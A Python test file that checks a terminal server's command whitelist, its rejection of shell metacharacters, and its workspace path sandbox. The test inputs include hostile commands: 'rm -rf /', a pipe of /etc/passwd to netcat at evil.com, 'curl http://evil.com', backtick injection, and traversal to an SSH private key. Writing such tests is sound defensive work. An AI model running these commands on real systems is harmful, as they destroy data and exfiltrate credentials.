"""
Tests for the terminal server security features.
"""

from mcp_servers.servers.terminal_server.terminal_server import (
    DEFAULT_WORKSPACE,
    validate_command,
    validate_paths,
)


class TestValidateCommand:
    """Tests for command validation security."""

    def test_allowed_command(self):
        """Should allow whitelisted commands."""
        is_valid, error = validate_command(["ls", "-la"])
        assert is_valid is True
        assert error == ""

    def test_allowed_command_with_path(self):
        """Should allow whitelisted commands with full path."""
        is_valid, error = validate_command(["/bin/ls", "-la"])
        assert is_valid is True
        assert error == ""

    def test_blocked_command(self):
        """Should block commands not in whitelist."""
        is_valid, error = validate_command(["rm", "-rf", "/"])
        # rm is in whitelist but let's test one that isn't
        is_valid, error = validate_command(["curl", "http://evil.com"])
        assert is_valid is False
        assert "not in the allowed list" in error

    def test_empty_command(self):
        """Should reject empty command."""
        is_valid, error = validate_command([])
        assert is_valid is False
        assert "Empty command" in error

    def test_dangerous_semicolon(self):
        """Should reject commands with semicolon (command chaining)."""
        is_valid, error = validate_command(["ls", "; rm -rf /"])
        assert is_valid is False
        assert "disallowed character" in error

    def test_dangerous_pipe(self):
        """Should reject commands with pipe."""
        is_valid, error = validate_command(["cat", "/etc/passwd", "|", "nc", "evil.com"])
        assert is_valid is False
        assert "disallowed character" in error

    def test_dangerous_backtick(self):
        """Should reject commands with backticks (command substitution)."""
        is_valid, error = validate_command(["echo", "`whoami`"])
        assert is_valid is False
        assert "disallowed character" in error

    def test_dangerous_dollar(self):
        """Should reject commands with dollar sign (variable expansion)."""
        is_valid, error = validate_command(["echo", "$PATH"])
        assert is_valid is False
        assert "disallowed character" in error

    def test_dangerous_ampersand(self):
        """Should reject commands with && (command chaining)."""
        is_valid, error = validate_command(["ls", "&&", "rm", "-rf", "/"])
        assert is_valid is False
        assert "disallowed character" in error

    def test_allowed_git_command(self):
        """Should allow git commands."""
        is_valid, error = validate_command(["git", "status"])
        assert is_valid is True

    def test_allowed_python_command(self):
        """Should allow python commands."""
        is_valid, error = validate_command(["python3", "script.py"])
        assert is_valid is True


class TestValidatePaths:
    """Tests for workspace path sandboxing."""

    def test_absolute_path_outside_workspace_rejected(self):
        """Should block absolute paths that escape the workspace."""
        is_valid, error = validate_paths(["rm", "-rf", "/etc/passwd"])
        assert is_valid is False
        assert "outside the workspace" in error

    def test_dotdot_escape_rejected(self):
        """Should block ../ traversal out of the workspace."""
        is_valid, error = validate_paths(["cat", "../../.ssh/id_rsa"])
        assert is_valid is False
        assert "outside the workspace" in error

    def test_relative_path_inside_workspace_allowed(self):
        """Should allow relative paths that stay inside the workspace."""
        is_valid, error = validate_paths(["mkdir", "demo/subdir"])
        assert is_valid is True
        assert error == ""

    def test_absolute_path_inside_workspace_allowed(self):
        """Should allow absolute paths that resolve inside the workspace."""
        inside = str(DEFAULT_WORKSPACE / "notes.txt")
        is_valid, error = validate_paths(["touch", inside])
        assert is_valid is True

    def test_flags_are_ignored(self):
        """Flags should not be treated as paths."""
        is_valid, error = validate_paths(["ls", "-la"])
        assert is_valid is True
